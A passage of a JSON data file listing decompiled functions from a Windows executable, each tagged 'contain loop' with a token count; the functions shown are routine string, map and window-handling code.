        "decompiled_code": "\nvoid fcn.00401c20(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_1 == NULL) {\n        fcn.00401b10(0, 0);\n        return;\n    }\n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00401b10(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 132
    },
    "00405f70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405f70(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_1 == NULL) {\n        fcn.00405e70(0, 0);\n        return;\n    }\n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00405e70(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 132
    },
    "00407fd0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00407fd0(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iStack4;\n    \n    iVar3 = 0;\n    iStack4 = 0;\n    if (0 < *(param_1 + 0x60)) {\n        do {\n            iVar2 = 0;\n            if (0 < *(param_1 + 0x5c)) {\n                do {\n                    iVar1 = (*_sym.imp.GDI32.dll_GetPixel)(*(param_2 + 4), iVar3, iVar2);\n                    if ((*(param_1 + 0x104) == 0) || (iVar5 = param_3,  iVar1 != 0x10000)) {\n                        if (iVar1 == 0x20000) {\n                            iVar5 = iStack4;\n                            if (*(param_1 + 0x10c) == 0) goto code_r0x0040803a;\n                            uVar4 = *(param_2 + 4);\n                            iVar5 = 0x5b5b5b;\n                            goto code_r0x00408041;\n                        }\n                    }\n                    else {\ncode_r0x0040803a:\n                        uVar4 = *(param_2 + 4);\ncode_r0x00408041:\n                        (*_sym.imp.GDI32.dll_SetPixel)(uVar4, iVar3, iVar2, iVar5);\n                    }\n                    iVar2 = iVar2 + 1;\n                    iStack4 = iVar1;\n                } while (iVar2 < *(param_1 + 0x5c));\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < *(param_1 + 0x60));\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "00410c2a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00410c2a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.00414501();\n    piVar2 = *(iVar1 + 0x88);\n    while( true ) {\n        if (piVar2 == NULL) {\n            return 1;\n        }\n        if (*piVar2 == param_1) break;\n        piVar2 = piVar2[1];\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "00411307": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint16_t * fcn.00411307(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = param_1;\n    do {\n        iVar1 = *param_2;\n        *piVar2 = iVar1;\n        piVar2 = piVar2 + 1;\n        param_2 = param_2 + 1;\n    } while (iVar1 != 0);\n    return param_1;\n}\n",
        "token_count": 116
    },
    "004125de": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004125de(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00412580(0x455de0, 0x14);\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        piVar1 = unaff_EBP + 0x10;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 < 0) break;\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) - *(unaff_EBP + 0xc);\n        (**(unaff_EBP + 0x14))();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 229
    },
    "00412844": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00412844(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    while( true ) {\n        if (*(iVar1 + 0x28) < 2) {\n            uVar2 = *(*(iVar1 + 0x48) + *param_1 * 2) & 8;\n        }\n        else {\n            uVar2 = fcn.004191e8(iVar1, *param_1, 8);\n        }\n        if (uVar2 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 437
    },
    "004130b9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004130b9(int32_t arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    \n    if (*(arg_8h + 8) == 0) {\n        iVar2 = fcn.0041a350(arg_ch, arg_10h);\n    }\n    else {\n        puVar3 = arg_ch;\n        puVar5 = arg_10h;\n        if (*arg_ch != 0) {\ncode_r0x0041310c:\n            do {\n                if (*puVar5 != 0) {\n                    uVar1 = *puVar5;\n                    if ((*(uVar1 + 0x1d + arg_8h) & 4) == 0) {\n                        puVar4 = puVar5;\n                        if (uVar1 != *puVar3) goto code_r0x0041310b;\n                    }\n                    else if (((uVar1 != *puVar3) || (puVar5[1] != puVar3[1])) && (puVar4 = puVar5 + 1,  *puVar4 != 0)) {\ncode_r0x0041310b:\n                        puVar5 = puVar4 + 1;\n                        goto code_r0x0041310c;\n                    }\n                }\n                if (((*puVar5 == 0) || (((*(*puVar3 + 0x1d + arg_8h) & 4) != 0 && (puVar3 = puVar3 + 1,  *puVar3 == 0)))\n                    ) || (puVar3 = puVar3 + 1,  puVar5 = arg_10h,  *puVar3 == 0)) break;\n            } while( true );\n        }\n        iVar2 = puVar3 - arg_ch;\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    },
    "00413157": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00413157(int32_t arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    \n    if (*(arg_8h + 8) == 0) {\n        iVar2 = fcn.0041a3a0(arg_ch, arg_10h);\n    }\n    else {\n        puVar3 = arg_ch;\n        puVar5 = arg_10h;\n        if (*arg_ch != 0) {\ncode_r0x004131aa:\n            do {\n                if (*puVar5 != 0) {\n                    uVar1 = *puVar5;\n                    if ((*(uVar1 + 0x1d + arg_8h) & 4) == 0) {\n                        puVar4 = puVar5;\n                        if (uVar1 != *puVar3) goto code_r0x004131a9;\n                    }\n                    else if (((uVar1 != *puVar3) || (puVar5[1] != puVar3[1])) && (puVar4 = puVar5 + 1,  *puVar4 != 0)) {\ncode_r0x004131a9:\n                        puVar5 = puVar4 + 1;\n                        goto code_r0x004131aa;\n                    }\n                }\n                if (((*puVar5 != 0) || (((*(*puVar3 + 0x1d + arg_8h) & 4) != 0 && (puVar3 = puVar3 + 1,  *puVar3 == 0)))\n                    ) || (puVar3 = puVar3 + 1,  puVar5 = arg_10h,  *puVar3 == 0)) break;\n            } while( true );\n        }\n        iVar2 = puVar3 - arg_ch;\n    }\n    return iVar2;\n}\n",
        "token_count": 451
    },
    "00413207": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00413207(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.00414501();\n    *(iVar1 + 0xc) = param_1;\n    uVar2 = 0;\n    do {\n        if (param_1 == *(uVar2 * 8 + 0x4641f8)) {\n            iVar1 = fcn.00414501();\n            *(iVar1 + 8) = *(uVar2 * 8 + 0x4641fc);\n            return;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x2d);\n    if ((0x12 < param_1) && (param_1 < 0x25)) {\n        iVar1 = fcn.00414501();\n        *(iVar1 + 8) = 0xd;\n        return;\n    }\n    if ((0xbb < param_1) && (param_1 < 0xcb)) {\n        iVar1 = fcn.00414501();\n        *(iVar1 + 8) = 8;\n        return;\n    }\n    iVar1 = fcn.00414501();\n    *(iVar1 + 8) = 0x16;\n    return;\n}\n",
        "token_count": 288
    },
    "00413831": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00413831(int32_t arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    \n    if (*(arg_8h + 8) == 0) {\n        uVar2 = fcn.0041b060(arg_ch, arg_10h);\n    }\n    else {\n        puVar4 = arg_10h;\n        if (*arg_ch != 0) {\ncode_r0x00413884:\n            do {\n                if (*puVar4 != 0) {\n                    uVar1 = *puVar4;\n                    if ((*(uVar1 + 0x1d + arg_8h) & 4) == 0) {\n                        puVar3 = puVar4;\n                        if (uVar1 != *arg_ch) goto code_r0x00413883;\n                    }\n                    else if (((uVar1 != *arg_ch) || (puVar4[1] != arg_ch[1])) && (puVar3 = puVar4 + 1,  *puVar3 != 0)) {\ncode_r0x00413883:\n                        puVar4 = puVar3 + 1;\n                        goto code_r0x00413884;\n                    }\n                }\n                if (((*puVar4 != 0) || (((*(*arg_ch + 0x1d + arg_8h) & 4) != 0 && (arg_ch = arg_ch + 1,  *arg_ch == 0)))\n                    ) || (arg_ch = arg_ch + 1,  puVar4 = arg_10h,  *arg_ch == 0)) break;\n            } while( true );\n        }\n        uVar2 = -(*arg_ch != 0) & arg_ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 429
    },
    "0041e379": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041e379(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    while( true ) {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (((cVar1 < 'A') || ('Z' < cVar1)) && ((cVar1 < 'a' || ('z' < cVar1)))) break;\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 131
    },
    "00422691": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00422691(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = in_ECX + 0x18;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar5);\n    iVar4 = 0;\n    if (0 < *(in_ECX + 0x34)) {\n        do {\n            iVar5 = iVar4;\n            piVar1 = fcn.004225c9();\n            if (*piVar1 == arg_8h) {\n                fcn.0042252b();\n                uVar3 = 1;\n                goto code_r0x004226cd;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < *(in_ECX + 0x34));\n    }\n    iVar4 = iVar5;\n    uVar3 = 0;\ncode_r0x004226cd:\n    uVar2 = fcn.00422642(iVar4);\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 282
    },
    "0042701c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042701c(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    if (param_3 != NULL) goto code_r0x00427032;\n    for (param_3 = *(param_1 + 4); (param_3 != NULL && (param_3[2] != param_2)); param_3 = *param_3) {\ncode_r0x00427032:\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00427251": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427251(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.0042eae6(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0042752d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042752d(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if ((arg_ch != 0) && (-1 < arg_8h)) {\n        if (0 < *(arg_ch + 8)) {\n            if (*(arg_ch + 8) < 1) goto code_r0x00427588;\n            fcn.00427448(arg_8h, **(arg_ch + 4), *(arg_ch + 8));\n            if (0 < *(arg_ch + 8)) {\n                do {\n                    fcn.0040f7d5(iVar2);\n                    fcn.0040f7f1();\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < *(arg_ch + 8));\n            }\n        }\n        return;\n    }\ncode_r0x00427588:\n    fcn.00422e61();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 247
    },
    "0042792f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042792f(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if ((arg_ch != 0) && (-1 < arg_8h)) {\n        if (0 < *(arg_ch + 8)) {\n            if (*(arg_ch + 8) < 1) goto code_r0x00427988;\n            fcn.0042782d(arg_8h, **(arg_ch + 4), *(arg_ch + 8));\n            if (0 < *(arg_ch + 8)) {\n                do {\n                    fcn.0040fc82(iVar2);\n                    fcn.0040fc9e();\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < *(arg_ch + 8));\n            }\n        }\n        return;\n    }\ncode_r0x00427988:\n    fcn.00422e61();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 245
    },
    "00427cb2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427cb2(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if ((arg_ch != 0) && (-1 < arg_8h)) {\n        if (0 < *(arg_ch + 8)) {\n            if (*(arg_ch + 8) < 1) goto code_r0x00427d0b;\n            fcn.00427bb0(arg_8h, **(arg_ch + 4), *(arg_ch + 8));\n            if (0 < *(arg_ch + 8)) {\n                do {\n                    fcn.004104d0(iVar2);\n                    fcn.004104ec();\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < *(arg_ch + 8));\n            }\n        }\n        return;\n    }\ncode_r0x00427d0b:\n    fcn.00422e61();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 247
    },
    "00427dc7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00427dc7(int32_t param_1, uint32_t param_2, uint32_t *param_3, uint32_t *param_4)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    *param_4 = param_2 >> 4;\n    uVar2 = (param_2 >> 4) % *(param_1 + 8);\n    *param_3 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 192
    },
    "00427dff": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00427dff(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    \n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 138
    },
    "00427e5d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00427e5d(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    \n    if (*(param_1 + 4) == 0) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar3 = *(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4;\n        puVar1 = *puVar3;\n        while (puVar2 = puVar1,  puVar2 != NULL) {\n            if (puVar2[1] == param_2) {\n                *puVar3 = *puVar2;\n                fcn.00427dae(puVar2);\n                return 0x1;\n            }\n            puVar3 = puVar2;\n            puVar1 = *puVar2;\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 219
    },
    "00428219": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428219(code **param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_1[1] != NULL) {\n        pcVar1 = NULL;\n        if (param_1[2] != NULL) {\n            do {\n                for (puVar2 = *(param_1[1] + pcVar1 * 4); puVar2 != NULL; puVar2 = *puVar2) {\n                    fcn.00401980();\n                }\n                pcVar1 = pcVar1 + 1;\n            } while (pcVar1 < param_1[2]);\n        }\n        fcn.0042eae6(param_1[1]);\n        param_1[1] = NULL;\n    }\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    fcn.00427251();\n    param_1[5] = NULL;\n    return;\n}\n",
        "token_count": 229
    },
    "0042a7bd": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042a7bd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(param_1 + 4));\n    iVar3 = 0;\n    if (0 < iVar1) {\n        do {\n            iVar2 = fcn.0040b64a(iVar3);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(param_1 + 4), iVar3);\n                if (iVar2 == param_1) {\n                    iVar1 = fcn.0042f7de(*(param_1 + 4));\n                    return iVar1;\n                }\n            }\n            else {\n                iVar2 = fcn.0042a7bd(iVar2, unaff_retaddr);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 254
    },
    "0042b752": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042b752(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    if ((param_1 == 0) || (iVar5 = *(param_1 + 0x1c),  iVar5 == 0)) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0);\n    while ((uVar2 & 0x40000000) != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar5);\n        if (iVar3 == 0) break;\n        uVar2 = (*pcVar1)(iVar3, 0xfffffff0);\n        iVar5 = iVar3;\n    }\n    uVar4 = fcn.0042b432(iVar5);\n    return uVar4;\n}\n",
        "token_count": 236
    },
    "0042b7b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b7b4(uint hDlg, uint nIDDlgItem, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetDlgItem)(hDlg, nIDDlgItem);\n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar2);\n        if ((iVar3 != 0) && (iVar3 = fcn.0042b7b4(iVar2, nIDDlgItem, arg_10h),  iVar3 != 0)) {\n            return;\n        }\n        if (arg_10h == 0) {\n            fcn.0042b432();\n            return;\n        }\n        iVar2 = fcn.0042b459(iVar2);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    iVar2 = (*pcVar1)(hDlg);\n    while( true ) {\n        if (iVar2 == 0) {\n            return;\n        }\n        iVar3 = fcn.0042b7b4(iVar2, nIDDlgItem, arg_10h);\n        if (iVar3 != 0) break;\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "0042b973": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0042b973(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar3 = *param_2;\n    while( true ) {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        piVar1 = fcn.0042b459(iVar3);\n        if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x100))(param_2),  iVar2 != 0)) break;\n        if (iVar3 == unaff_retaddr) {\n            return 0;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 186
    },
    "0042bb4d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042bb4d(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint lpMsg;\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        iVar2 = (*pcVar1)(&lpMsg, 0, 0x121, 0x121, 1);\n        if (iVar2 == 0) break;\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n    }\n    fcn.0042b38f();\n    return;\n}\n",
        "token_count": 129
    },
    "0042bedc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042bedc(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    if ((param_1 != 0) && (iVar2 = *(param_1 + 0x1c),  iVar2 != 0)) {\n        while( true ) {\n            uVar3 = (*pcVar1)(iVar2);\n            piVar4 = fcn.0042b432(uVar3);\n            if ((piVar4 == NULL) || (iVar2 = (**(*piVar4 + 0x120))(),  iVar2 != 0)) break;\n            iVar2 = piVar4[7];\n        }\n        return piVar4;\n    }\n    return NULL;\n}\n",
        "token_count": 195
    },
    "0042c0df": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042c0df(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    iVar4 = 0;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindow)(*(param_1 + 0x1c), 5);\n    iVar3 = fcn.0042b432(uVar2);\n    while (iVar3 != 0) {\n        uVar2 = (*pcVar1)(*(iVar3 + 0x1c), 2);\n        iVar3 = fcn.0042b432(uVar2);\n        iVar4 = iVar4 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 181
    },
    "0042c69d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042c69d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x1c),  *(param_1 + 0x1c) != 0)) {\n        do {\n            iVar3 = iVar1;\n            iVar1 = fcn.0042c658(iVar3);\n        } while (iVar1 != 0);\n        uVar2 = fcn.0042b432(iVar3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 149
    },
    "0042eabb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042eabb(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0041101f(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x4637ac == NULL) break;\n        iVar1 = (**0x4637ac)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0042eaeb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042eaeb(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0041101f(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x4637ac == NULL) break;\n        iVar1 = (**0x4637ac)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0042ffa1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042ffa1(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (***param_1)();\n    if (param_2 != 0) {\n        for (; iVar1 != 0; iVar1 = *(iVar1 + 0x10)) {\n            if (iVar1 == param_2) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "00434d89": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00434d89(int32_t hWnd, uint lpPoint, uint arg_10h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpRect;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(hWnd, &lpPoint);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    uVar5 = 5;\n    do {\n        hWnd = (*pcVar1)(hWnd, uVar5);\n        if (hWnd == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(hWnd);\n        if ((iVar2 != 0) &&\n           (uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar3 & 0x10000000) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&lpRect, lpPoint, arg_10h);\n            if (iVar4 != 0) {\n                return hWnd;\n            }\n        }\n        uVar5 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "004351f6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.004351f6(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00444bf8();\n    fcn.0044673a(0);\n    for (puVar2 = *(iVar1 + 0x1c); puVar2 != NULL; puVar2 = puVar2[5]) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(unaff_retaddr, *puVar2);\n        if (iVar1 == 0) break;\n    }\n    fcn.0044679d(0);\n    return puVar2;\n}\n",
        "token_count": 149
    },
    "004365bb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004365bb(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00401200();\n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = fcn.00444bc2(unaff_ESI, extraout_ECX);\n    iVar1 = *(iVar3 + 0xe4);\n    while (iVar1 == extraout_ECX) {\n        puVar2 = *(iVar3 + 0xe8);\n        *(puVar2[1] + 0xe4) = *puVar2;\n        *(puVar2[1] + 0xe8) = puVar2[2];\n        puVar2[1] = 0;\n        iVar1 = *(iVar3 + 0xe4);\n    }\n    if (*(extraout_ECX + 0x50) != 0) {\n        fcn.004366ee(extraout_ECX);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042bd92();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 352
    },
    "004376ee": {
        "rules": [
            "contain loop"
        ],
